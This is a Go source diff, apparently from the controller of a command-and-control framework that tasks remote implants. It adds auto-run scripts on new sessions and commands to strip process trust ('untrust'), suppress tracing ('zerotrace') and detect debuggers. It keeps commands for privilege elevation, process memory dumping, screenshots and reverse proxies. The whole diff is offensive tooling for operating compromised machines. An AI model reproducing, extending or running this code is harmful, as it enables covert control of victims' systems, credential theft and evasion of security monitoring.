@@ -21,7 +21,7 @@ var (
 	errEmptyFilter    = xerr.New("invalid or empty filter")
 	errInvalidSleep   = xerr.New("invalid sleep value")
 	errInvalidJitter  = xerr.New("invalid jitter value")
-	errInvalidCommand = xerr.New("invalid or unrecognized command")
+	errUnknownCommand = xerr.New("invalid or unrecognized command")
 )
 
 type session struct {
@@ -43,13 +43,32 @@ func (c *Cirrus) newSession(s *c2.Session) {
 	}
 	n := s.ID.String()
 	c.sessions.Lock()
-	if _, ok := c.sessions.e[n]; !ok {
-		c.sessions.e[n] = &session{s: s, h: s.ID.Hash()}
+	x, ok := c.sessions.e[n]
+	if !ok {
+		x = &session{s: s, h: s.ID.Hash()}
+		c.sessions.e[n] = x
 	}
 	c.sessions.Unlock()
 	c.sessions.events.publishSessionNew(n)
 	s.Receive, s.Shutdown = c.migrateSession, c.shutdownSession
 	c.sessionEvent(s, sSessionNew)
+	l := s.Listener()
+	if l == nil {
+		return
+	}
+	v := strings.ToLower(l.String())
+	c.listeners.RLock()
+	z, ok := c.listeners.e[v]
+	if c.listeners.RUnlock(); !ok || len(z.s) == 0 {
+		return
+	}
+	q, _ := c.script(z.s)
+	q.Lock()
+	j, err := s.Tasklet(q.s)
+	if q.Unlock(); err != nil {
+		return
+	}
+	c.watchJob(x, j, "auto script "+z.s)
 }
 func (c *Cirrus) session(n string) *session {
 	if len(n) == 0 || !isValidName(n) {
@@ -116,115 +135,115 @@ func (c *Cirrus) migrateSession(s *c2.Session, n *com.Packet) {
 	c.events.publishSessionUpdate(i)
 	c.sessionEvent(s, sSessionUpdate)
 }
-func (s *session) systemTask(c, a string, f *filter.Filter) (*c2.Job, error) {
+func syscallPacket(c, a string, f *filter.Filter) (*com.Packet, error) {
 	if len(c) == 0 {
-		return nil, errInvalidCommand
+		return nil, errUnknownCommand
 	}
 	if len(a) == 0 {
-		return s.systemTaskSingle(c, f)
+		return syscallSinglePacket(c, f)
 	}
-	switch strings.ToLower(c) {
+	switch a = strings.TrimSpace(a); strings.ToLower(c) {
 	case "ls":
-		if a[0] == '-' && len(a) > 2 {
-			// NOTE(dij): Cut out any '-al' force of habit.
-			if i := strings.IndexByte(a, 32); i > 0 {
-				return s.s.Task(task.Ls(a[i+1:]))
-			}
+		if a == "-al" {
+			return task.Ls(""), nil
 		}
-		return s.s.Task(task.Ls(a))
+		return task.Ls(a), nil
 	case "cd":
-		return s.s.Task(task.Cwd(a))
-	case "chan":
-		if len(a) == 0 {
-			s.s.SetChannel(true)
-			return nil, nil
-		}
-		switch a[0] {
-		case 't', 'T', 'e', 'E', 'y', 'Y', '1':
-			s.s.SetChannel(true)
-		default:
-			s.s.SetChannel(false)
-		}
-		return nil, nil
-	case "sleep":
-		if k := strings.IndexByte(a, '/'); k > 0 {
-			var (
-				w, v   = strings.ToLower(strings.TrimSpace(a[:k])), strings.TrimSpace(a[k+1:])
-				d, err = parseSleep(w)
-			)
-			if err != nil {
-				return nil, err
-			}
-			if len(v) == 0 {
-				return s.s.SetSleep(d)
-			}
-			j, err := parseJitter(v)
-			if err != nil {
-				return nil, err
-			}
-			return s.s.SetDuration(d, j)
-		}
-		d, err := parseSleep(a)
+		return task.Cwd(a), nil
+	case "wait":
+		d, err := parseDuration(a)
 		if err != nil {
 			return nil, err
 		}
-		return s.s.SetSleep(d)
+		return task.Wait(d), nil
+	case "chan":
+		return nil, nil
+	case "sleep":
+		d, j, err := parseSleep(a)
+		if err != nil {
+			return nil, err
+		}
+		return task.Duration(d, j), nil
 	case "jitter":
 		j, err := parseJitter(a)
 		if err != nil {
 			return nil, err
 		}
-		return s.s.SetJitter(j)
+		return task.Jitter(j), nil
 	case "elevate":
-		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 4 {
-			return s.s.Task(task.Elevate(&filter.Filter{PID: uint32(i)}))
+		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 0 {
+			return task.Elevate(&filter.Filter{PID: uint32(i)}), nil
 		}
-		return s.s.Task(task.Elevate(filter.I(a)))
+		return task.Elevate(filter.I(a)), nil
+	case "untrust":
+		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 0 {
+			return task.UnTrust(&filter.Filter{PID: uint32(i)}), nil
+		}
+		return task.UnTrust(filter.I(a)), nil
 	case "procdump":
-		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 4 {
-			return s.s.Task(task.ProcessDump(&filter.Filter{PID: uint32(i)}))
+		if i, err := strconv.ParseUint(a, 10, 32); err == nil && i > 0 {
+			return task.ProcessDump(&filter.Filter{PID: uint32(i)}), nil
 		}
-		return s.s.Task(task.ProcessDump(filter.I(a)))
+		return task.ProcessDump(filter.I(a)), nil
 	case "procname":
-		return s.s.Task(task.ProcessName(a))
+		return task.ProcessName(a), nil
 	case "check-dll":
-		return s.s.Task(task.CheckDLL(a))
+		return task.CheckDLL(a), nil
 	case "reload-dll":
-		return s.s.Task(task.ReloadDLL(a))
+		return task.ReloadDLL(a), nil
 	}
-	return nil, errInvalidCommand
+	return nil, errUnknownCommand
 }
-func (s *session) systemTaskSingle(c string, f *filter.Filter) (*c2.Job, error) {
-	switch c {
+func syscallSinglePacket(c string, f *filter.Filter) (*com.Packet, error) {
+	switch strings.ToLower(c) {
 	case "ls":
-		return s.s.Task(task.Ls(""))
+		return task.Ls(""), nil
 	case "ps":
-		return s.s.Task(task.ProcessList())
+		return task.ProcessList(), nil
 	case "pwd":
-		return s.s.Task(task.Pwd())
+		return task.Pwd(), nil
 	case "chan":
-		s.s.SetChannel(true)
 		return nil, nil
 	case "mounts":
-		return s.s.Task(task.Mounts())
+		return task.Mounts(), nil
 	case "elevate":
 		if f.Empty() {
 			return nil, errEmptyFilter
 		}
-		return s.s.Task(task.Elevate(f))
+		return task.Elevate(f), nil
 	case "refresh":
-		return s.s.Task(task.Refresh())
+		return task.Refresh(), nil
+	case "untrust":
+		if f.Empty() {
+			return nil, errEmptyFilter
+		}
+		return task.UnTrust(f), nil
 	case "rev2self":
-		return s.s.Task(task.RevToSelf())
+		return task.RevToSelf(), nil
 	case "procdump":
 		if f.Empty() {
 			return nil, errEmptyFilter
 		}
-		return s.s.Task(task.ProcessDump(f))
+		return task.ProcessDump(f), nil
+	case "zerotrace":
+		return task.ZeroTrace(), nil
 	case "screenshot":
-		return s.s.Task(task.ScreenShot())
+		return task.ScreenShot(), nil
+	case "check-debug":
+		return task.IsDebugged(), nil
 	}
-	return nil, errInvalidCommand
+	return nil, errUnknownCommand
+}
+func (s *session) syscall(c, a string, f *filter.Filter) (*c2.Job, error) {
+	n, err := syscallPacket(c, a, f)
+	if err != nil {
+		return nil, err
+	}
+	if n == nil && err == nil {
+		s.s.SetChannel(isTrue(a))
+		return nil, nil
+	}
+	return s.s.Task(n)
 }
 func (s *sessionManager) httpSessionGet(_ context.Context, w http.ResponseWriter, r *routex.Request) {
 	x := s.session(r.Values.StringDefault("session", ""))
@@ -275,13 +294,13 @@ func (s *sessionManager) httpSessionProxyDelete(_ context.Context, w http.Respon
 		writeError(http.StatusBadRequest, `value "name" cannot be invalid`, w, r)
 		return
 	}
-	j, err := x.s.Task(task.ProxyRemove(n))
+	j, err := x.s.Task(task.ProxyRemove(strings.ToLower(n)))
 	if err != nil {
 		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
 		return
 	}
 	s.watchJob(x, j, "proxy delete "+n)
-	w.WriteHeader(http.StatusCreated)
+	w.WriteHeader(http.StatusOK)
 	j.JSON(w)
 }
 func (s *sessionManager) httpSessionProxyPutPost(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
@@ -296,13 +315,9 @@ func (s *sessionManager) httpSessionProxyPutPost(_ context.Context, w http.Respo
 		return
 	}
 	var (
-		b = c.StringDefault("address", "")
-		p = s.profile(c.StringDefault("profile", ""))
+		b    = c.StringDefault("address", "")
+		p, _ = s.profile(c.StringDefault("profile", ""))
 	)
-	if len(p) == 0 {
-		writeError(http.StatusBadRequest, msgNoProfile, w, r)
-		return
-	}
 	if len(b) == 0 {
 		writeError(http.StatusBadRequest, `value "address" cannot be empty`, w, r)
 		return
@@ -320,7 +335,12 @@ func (s *sessionManager) httpSessionProxyPutPost(_ context.Context, w http.Respo
 		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
 		return
 	}
-	s.watchJob(x, j, "proxy add|mod "+n+" "+b+" "+p.String())
-	w.WriteHeader(http.StatusCreated)
+	if r.IsPost() {
+		s.watchJob(x, j, "proxy mod "+n+" "+b+" "+p.String())
+		w.WriteHeader(http.StatusOK)
+	} else {
+		s.watchJob(x, j, "proxy add "+n+" "+b+" "+p.String())
+		w.WriteHeader(http.StatusCreated)
+	}
 	j.JSON(w)
 }
